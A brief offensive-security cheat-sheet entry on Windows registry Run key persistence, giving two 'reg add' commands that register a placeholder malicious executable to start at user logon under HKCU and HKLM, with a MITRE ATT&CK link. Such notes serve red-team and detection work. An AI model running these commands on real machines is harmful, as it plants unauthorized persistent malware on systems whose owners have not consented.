# Registry Run Keys for Persistence

## Register Malicious Executable to Run when Users Log In

```powershell
# The malicious executable will start when the current user logs in. 
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\evil.exe" /f

# The malicious executable will start when any users log in.
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\evil.exe" /f
```

## Resources

- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1547/001/)